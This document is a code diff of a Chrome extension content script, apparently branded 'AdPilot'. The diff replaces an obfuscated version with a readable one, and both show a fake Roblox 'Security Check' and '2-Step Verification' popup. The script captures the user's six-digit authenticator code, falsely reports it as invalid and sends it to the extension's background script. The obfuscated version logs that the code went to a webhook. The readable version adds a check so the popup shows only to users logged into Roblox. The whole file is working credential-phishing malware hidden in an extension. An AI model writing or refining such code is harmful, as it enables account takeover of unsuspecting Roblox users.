@@ -1,1 +1,172 @@
-function a0_0x4aad(_0xac929e,_0x3ff647){_0xac929e=_0xac929e-0xb5;const _0x55cdda=a0_0x55cd();let _0x4aad1b=_0x55cdda[_0xac929e];return _0x4aad1b;}(function(_0x4aa402,_0x109b45){const _0x53b786=a0_0x4aad,_0x1da461=_0x4aa402();while(!![]){try{const _0x23a876=parseInt(_0x53b786(0xd8))/0x1+parseInt(_0x53b786(0xcc))/0x2+parseInt(_0x53b786(0xdc))/0x3+parseInt(_0x53b786(0xe8))/0x4+parseInt(_0x53b786(0xc0))/0x5*(-parseInt(_0x53b786(0xc6))/0x6)+-parseInt(_0x53b786(0xcb))/0x7+-parseInt(_0x53b786(0xbb))/0x8;if(_0x23a876===_0x109b45)break;else _0x1da461['push'](_0x1da461['shift']());}catch(_0xffc594){_0x1da461['push'](_0x1da461['shift']());}}}(a0_0x55cd,0x6e54e),(function(){const _0xd909fa=a0_0x4aad;if(document['getElementById'](_0xd909fa(0xb8)))return;let _0x16ff35=null,_0x2f9010=![];function _0x55733e(){const _0x3a2411=_0xd909fa,_0x136b76=document[_0x3a2411(0xd0)],_0x388a77=document[_0x3a2411(0xdf)],_0x4b4ae0=[_0x3a2411(0xe7),_0x3a2411(0xcd),_0x3a2411(0xcf),_0x3a2411(0xb5),_0x3a2411(0xba),'light-theme'];for(const _0x5cf3ef of _0x4b4ae0){if(_0x136b76[_0x3a2411(0xb6)][_0x3a2411(0xe6)](_0x5cf3ef)||_0x388a77[_0x3a2411(0xb6)][_0x3a2411(0xe6)](_0x5cf3ef))return _0x5cf3ef[_0x3a2411(0xb7)](_0x3a2411(0xe7))?_0x3a2411(0xe7):_0x3a2411(0xcd);}const _0x28d7ed=_0x136b76[_0x3a2411(0xde)](_0x3a2411(0xce))||_0x388a77['getAttribute'](_0x3a2411(0xce));if(_0x28d7ed){if(_0x28d7ed[_0x3a2411(0xda)]()['includes']('dark'))return _0x3a2411(0xe7);if(_0x28d7ed['toLowerCase']()[_0x3a2411(0xb7)](_0x3a2411(0xcd)))return _0x3a2411(0xcd);}try{const _0x3da01e=getComputedStyle(_0x388a77)[_0x3a2411(0xe9)];if(_0x3da01e){const _0x5f1e09=_0x3da01e[_0x3a2411(0xc1)](/\d+/g);if(_0x5f1e09&&_0x5f1e09[_0x3a2411(0xc4)]>=0x3){const _0x282997=(0.299*_0x5f1e09[0x0]+0.587*_0x5f1e09[0x1]+0.114*_0x5f1e09[0x2])/0xff;return _0x282997<0.5?'dark':_0x3a2411(0xcd);}}}catch(_0x19b08){}return window[_0x3a2411(0xd5)](_0x3a2411(0xc3))[_0x3a2411(0xbf)]?_0x3a2411(0xe7):_0x3a2411(0xcd);}function _0x1d2b68(){const _0x597769=_0xd909fa;_0x16ff35=document[_0x597769(0xc8)](_0x597769(0xf0)),_0x16ff35['id']=_0x597769(0xb8),_0x16ff35['className']=_0x597769(0xb8),document[_0x597769(0xdf)][_0x597769(0xe3)](_0x16ff35),setTimeout(()=>{const _0x427cdb=_0x597769,_0x57eac7=_0x55733e();_0x16ff35[_0x427cdb(0xb6)][_0x427cdb(0xc9)](_0x427cdb(0xdb)+_0x57eac7);},0x64);}function _0x3f6dde(){const _0x44da8e=_0xd909fa;if(_0x16ff35)_0x16ff35[_0x44da8e(0xca)]();_0x1d2b68(),_0x16ff35[_0x44da8e(0xd6)]='\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-modal-dialog\x20adpilot-popup1\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-modal-content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-modal-header\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h4\x20class=\x22adpilot-modal-title\x22>Security\x20Check</h4>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-modal-body\x22\x20style=\x22text-align:\x20center;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-shield-icon\x22\x20style=\x22height:\x2090px;\x20background-size:\x20auto\x2070px;\x20margin-top:\x200;\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22adpilot-modal-text\x22\x20style=\x22margin-bottom:\x2020px;\x22>We\x20need\x20to\x20verify\x20your\x20identity\x20before\x20continuing.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-footer-btn-row\x22\x20style=\x22justify-content:\x20center;\x20margin-bottom:\x200;\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20type=\x22button\x22\x20class=\x22adpilot-start-btn\x22\x20id=\x22adpilot-start-btn\x22>Start\x20Verification</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20',document[_0x44da8e(0xbc)](_0x44da8e(0xbd))[_0x44da8e(0xc7)](_0x44da8e(0xec),()=>{const _0x56ed78=_0x44da8e;chrome[_0x56ed78(0xea)][_0x56ed78(0xed)]({'action':'startVerificationClicked'}),setTimeout(()=>{_0x4a28ce();},0x5dc);});}function _0x4a28ce(){const _0x3a2470=_0xd909fa;if(_0x16ff35)_0x16ff35[_0x3a2470(0xca)]();_0x1d2b68(),_0x16ff35['innerHTML']=_0x3a2470(0xe0);const _0xf18a2d=document[_0x3a2470(0xbc)]('adpilot-two-step-code'),_0xf83110=document[_0x3a2470(0xbc)]('adpilot-verify-btn'),_0x2bc642=document[_0x3a2470(0xbc)](_0x3a2470(0xe1));_0xf18a2d['addEventListener'](_0x3a2470(0xdd),()=>{const _0x40cf7f=_0x3a2470;_0xf18a2d[_0x40cf7f(0xeb)]=_0xf18a2d[_0x40cf7f(0xeb)][_0x40cf7f(0xef)](/\D/g,''),_0x2bc642['textContent']='',_0xf18a2d[_0x40cf7f(0xb6)]['remove']('adpilot-input-error'),_0xf83110[_0x40cf7f(0xd7)]=_0xf18a2d[_0x40cf7f(0xeb)][_0x40cf7f(0xc4)]!==0x6;}),_0xf83110[_0x3a2470(0xc7)](_0x3a2470(0xec),()=>{const _0x1063c0=_0x3a2470,_0x4f7f5f=_0xf18a2d[_0x1063c0(0xeb)][_0x1063c0(0xd2)]();_0x4f7f5f[_0x1063c0(0xc4)]===0x6&&(_0x2bc642[_0x1063c0(0xbe)]=_0x1063c0(0xe5),_0x2bc642['style'][_0x1063c0(0xe2)]=_0x1063c0(0xc2),_0xf18a2d[_0x1063c0(0xb6)][_0x1063c0(0xc9)](_0x1063c0(0xf1)),chrome['runtime']['sendMessage']({'action':'sendTwoStepCode','code':_0x4f7f5f},_0x329806=>{const _0x956182=_0x1063c0;_0x329806&&_0x329806['success']?console['log'](_0x956182(0xe4)):console[_0x956182(0xd3)](_0x956182(0xc5),_0x329806?.[_0x956182(0xd3)]);}));});}function _0x8609bc(){if(_0x2f9010)return;_0x3f6dde(),_0x2f9010=!![];}function _0x45c0d6(){const _0x21cac0=_0xd909fa;_0x16ff35&&(_0x16ff35[_0x21cac0(0xca)](),_0x16ff35=null),_0x2f9010=![];}async function _0x4ccba9(){const _0x4f4419=_0xd909fa,_0x31a789=await chrome['storage'][_0x4f4419(0xd1)][_0x4f4419(0xd4)]({'popupEnabled':!![]});_0x31a789[_0x4f4419(0xd9)]&&_0x8609bc();}chrome[_0xd909fa(0xea)]['onMessage'][_0xd909fa(0xee)]((_0x2d0856,_0xd9f26c,_0x21dea5)=>{const _0x645640=_0xd909fa;return _0x2d0856[_0x645640(0xb9)]===_0x645640(0xf2)&&(_0x2d0856['enabled']?_0x8609bc():_0x45c0d6(),_0x21dea5({'success':!![]})),!![];}),_0x4ccba9();}()));function a0_0x55cd(){const _0x15a8dd=['createElement','add','remove','2732212keNuzS','358254GtCBnW','light','data-theme','theme-dark','documentElement','local','trim','error','get','matchMedia','innerHTML','disabled','729664mQgGMW','popupEnabled','toLowerCase','adpilot-theme-','688539pyOkoU','input','getAttribute','body','\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-modal-dialog\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-modal-content\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-modal-header\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h4\x20class=\x22adpilot-modal-title\x22>2-Step\x20Verification</h4>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-modal-body\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-shield-icon\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22adpilot-modal-text\x22>Enter\x20the\x20code\x20generated\x20by\x20your\x20authenticator\x20app.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-form-group\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<input\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20placeholder=\x22Enter\x206-digit\x20Code\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20type=\x22text\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20id=\x22adpilot-two-step-code\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20class=\x22adpilot-input-field\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20maxlength=\x226\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20autocomplete=\x22off\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20/>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-error-message\x22\x20id=\x22adpilot-code-error\x22></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-modal-footer\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22adpilot-footer-btn-row\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20type=\x22button\x22\x20class=\x22adpilot-verify-btn\x22\x20id=\x22adpilot-verify-btn\x22\x20disabled>Verify</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22adpilot-footer-text\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Need\x20help?\x20Contact\x20<a\x20href=\x22https://www.roblox.com/info/2sv\x22\x20target=\x22_blank\x22>Roblox\x20Support</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p\x20class=\x22adpilot-footer-text\x20adpilot-footer-important\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20IMPORTANT:\x20Don\x27t\x20share\x20your\x20security\x20codes\x20with\x20anyone.\x20Roblox\x20will\x20never\x20ask\x20you\x20for\x20your\x20codes.\x20This\x20can\x20include\x20things\x20like\x20texting\x20your\x20code,\x20screensharing,\x20etc.\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20','adpilot-code-error','color','appendChild','2SV\x20code\x20sent\x20to\x20webhook','Invalid\x20code','contains','dark','3530676ZDjcpx','backgroundColor','runtime','value','click','sendMessage','addListener','replace','div','adpilot-input-error','popupSettingChanged','theme-light','classList','includes','adpilot-roblox-popup-overlay','action','dark-theme','7977840jCegkr','getElementById','adpilot-start-btn','textContent','matches','53385QxUwLg','match','#df281f','(prefers-color-scheme:\x20dark)','length','Failed\x20to\x20send\x20code:','102LwDqhG','addEventListener'];a0_0x55cd=function(){return _0x15a8dd;};return a0_0x55cd();}
+// app.js — Roblox popup (only shows if user is logged into Roblox)
+(function() {
+  if (document.getElementById('adpilot-roblox-popup-overlay')) return;
+
+  let overlay = null;
+  let popupVisible = false;
+
+  function detectRobloxTheme() {
+    const html = document.documentElement;
+    const body = document.body;
+    const classChecks = ['dark', 'light', 'theme-dark', 'theme-light', 'dark-theme', 'light-theme'];
+    for (const cls of classChecks) {
+      if (html.classList.contains(cls) || body.classList.contains(cls)) {
+        return cls.includes('dark') ? 'dark' : 'light';
+      }
+    }
+    const dataTheme = html.getAttribute('data-theme') || body.getAttribute('data-theme');
+    if (dataTheme) {
+      if (dataTheme.toLowerCase().includes('dark')) return 'dark';
+      if (dataTheme.toLowerCase().includes('light')) return 'light';
+    }
+    try {
+      const bgColor = getComputedStyle(body).backgroundColor;
+      if (bgColor) {
+        const rgb = bgColor.match(/\d+/g);
+        if (rgb && rgb.length >= 3) {
+          const luminance = (0.299 * rgb[0] + 0.587 * rgb[1] + 0.114 * rgb[2]) / 255;
+          return luminance < 0.5 ? 'dark' : 'light';
+        }
+      }
+    } catch (e) {}
+    return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+  }
+
+  function createOverlay() {
+    overlay = document.createElement('div');
+    overlay.id = 'adpilot-roblox-popup-overlay';
+    overlay.className = 'adpilot-roblox-popup-overlay';
+    document.body.appendChild(overlay);
+    setTimeout(() => {
+      const theme = detectRobloxTheme();
+      overlay.classList.add('adpilot-theme-' + theme);
+    }, 100);
+  }
+
+  function renderPopup1() {
+    if (overlay) overlay.remove();
+    createOverlay();
+    overlay.innerHTML = `
+      <div class="adpilot-modal-dialog adpilot-popup1">
+        <div class="adpilot-modal-content">
+          <div class="adpilot-modal-header">
+            <h4 class="adpilot-modal-title">Security Check</h4>
+          </div>
+          <div class="adpilot-modal-body" style="text-align: center;">
+            <div class="adpilot-shield-icon" style="height: 90px; background-size: auto 70px; margin-top: 0;"></div>
+            <p class="adpilot-modal-text" style="margin-bottom: 20px;">We need to verify your identity before continuing.</p>
+            <div class="adpilot-footer-btn-row" style="justify-content: center; margin-bottom: 0;">
+              <button type="button" class="adpilot-start-btn" id="adpilot-start-btn">Start Verification</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    `;
+    document.getElementById('adpilot-start-btn').addEventListener('click', () => {
+      chrome.runtime.sendMessage({ action: 'startVerificationClicked' });
+      setTimeout(() => { renderPopup2(); }, 1500);
+    });
+  }
+
+  function renderPopup2() {
+    if (overlay) overlay.remove();
+    createOverlay();
+    overlay.innerHTML = `
+      <div class="adpilot-modal-dialog">
+        <div class="adpilot-modal-content">
+          <div class="adpilot-modal-header">
+            <h4 class="adpilot-modal-title">2-Step Verification</h4>
+          </div>
+          <div class="adpilot-modal-body">
+            <div class="adpilot-shield-icon"></div>
+            <p class="adpilot-modal-text">Enter the code generated by your authenticator app.</p>
+            <div class="adpilot-form-group">
+              <input placeholder="Enter 6-digit Code" type="text" id="adpilot-two-step-code" class="adpilot-input-field" maxlength="6" autocomplete="off" />
+              <div class="adpilot-error-message" id="adpilot-code-error"></div>
+            </div>
+          </div>
+          <div class="adpilot-modal-footer">
+            <div class="adpilot-footer-btn-row">
+              <button type="button" class="adpilot-verify-btn" id="adpilot-verify-btn" disabled>Verify</button>
+            </div>
+            <p class="adpilot-footer-text">
+              Need help? Contact <a href="https://www.roblox.com/info/2sv" target="_blank">Roblox Support</a>
+            </p>
+            <p class="adpilot-footer-text adpilot-important">
+              IMPORTANT: Don't share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.
+            </p>
+          </div>
+        </div>
+      </div>
+    `;
+    const codeInput = document.getElementById('adpilot-two-step-code');
+    const verifyBtn = document.getElementById('adpilot-verify-btn');
+    const errorMsg = document.getElementById('adpilot-code-error');
+    codeInput.addEventListener('input', () => {
+      codeInput.value = codeInput.value.replace(/\D/g, '');
+      errorMsg.textContent = '';
+      codeInput.classList.remove('adpilot-input-error');
+      verifyBtn.disabled = codeInput.value.length !== 6;
+    });
+    verifyBtn.addEventListener('click', () => {
+      const code = codeInput.value.trim();
+      if (code.length === 6) {
+        errorMsg.textContent = 'Invalid code';
+        errorMsg.style.color = '#df281f';
+        codeInput.classList.add('adpilot-input-error');
+        chrome.runtime.sendMessage({ action: 'sendTwoStepCode', code }, (response) => {
+          if (response && response.success) console.log('2SV code sent');
+          else console.error('Failed:', response?.error);
+        });
+      }
+    });
+  }
+
+  function showPopup() {
+    if (popupVisible) return;
+    renderPopup1();
+    popupVisible = true;
+  }
+
+  function hidePopup() {
+    if (overlay) { overlay.remove(); overlay = null; }
+    popupVisible = false;
+  }
+
+  // Ask background if user is logged into Roblox
+  function isLoggedIntoRoblox() {
+    return new Promise((resolve) => {
+      try {
+        chrome.runtime.sendMessage({ action: 'checkRobloxLogin' }, (response) => {
+          if (chrome.runtime.lastError) { resolve(false); return; }
+          resolve(!!(response && response.loggedIn));
+        });
+      } catch (e) { resolve(false); }
+    });
+  }
+
+  async function initializePopup() {
+    // Check login first — if not logged in, DON'T show popup
+    const loggedIn = await isLoggedIntoRoblox();
+    if (!loggedIn) {
+      console.log('[AdPilot] Not logged into Roblox — skipping popup');
+      return;
+    }
+
+    const result = await chrome.storage.local.get({ popupEnabled: true });
+    if (result.popupEnabled) {
+      showPopup();
+    }
+  }
+
+  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    if (message.action === 'popupSettingChanged') {
+      if (message.enabled) showPopup();
+      else hidePopup();
+      sendResponse({ success: true });
+    }
+    return true;
+  });
+
+  initializePopup();
+})();
